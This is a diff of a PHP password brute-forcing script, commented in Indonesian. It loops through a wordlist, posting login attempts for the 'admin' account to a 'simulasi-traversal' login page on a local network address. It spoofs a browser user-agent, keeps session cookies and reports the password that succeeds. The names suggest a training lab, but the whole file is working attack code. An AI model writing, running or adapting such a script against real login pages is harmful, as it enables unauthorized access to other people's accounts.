@@ -1,14 +1,16 @@
 <?php
-$loginUrl = "http://localhost/simulasi-traversal/login.php"; // URL proses login
-$username = "admin"; // Username target
-$wordlistFile = "passwordlist.txt"; // Daftar password
+$loginUrl = "http://192.168.17.5/cyber.security/simulasi-traversal/login.php";
+$username = "admin";
+$wordlistFile = "passwordlist.txt";
 
-// Cek file wordlist
 if (!file_exists($wordlistFile)) {
     die("File wordlist tidak ditemukan: $wordlistFile\n");
 }
 
 $passwords = file($wordlistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+// Temp file untuk cookie session jika dibutuhkan
+$cookieFile = tempnam(sys_get_temp_dir(), 'cookie');
 
 foreach ($passwords as $password) {
     $postData = http_build_query([
@@ -17,22 +19,32 @@ foreach ($passwords as $password) {
     ]);
 
     $ch = curl_init($loginUrl);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $postData,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_TIMEOUT => 5,
+        CURLOPT_COOKIEJAR => $cookieFile,
+        CURLOPT_COOKIEFILE => $cookieFile,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        CURLOPT_HEADER => false
+    ]);
 
     $response = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // Useful for redirection
     curl_close($ch);
 
-    // Ubah deteksi sukses sesuai dengan sistem target
-    if (strpos($response, "Selamat datang") !== false || $httpCode == 302) {
+    // Cek login berhasil:
+    if (strpos($response, "index.php") !== false || strpos($finalUrl, "index.php") !== false) {
         echo "[+] BERHASIL: Password ditemukan => '$password'\n";
         break;
     } else {
         echo "[-] Gagal login dengan password: $password\n";
     }
 }
+
+// Hapus file cookie sementara
+@unlink($cookieFile);
 ?>
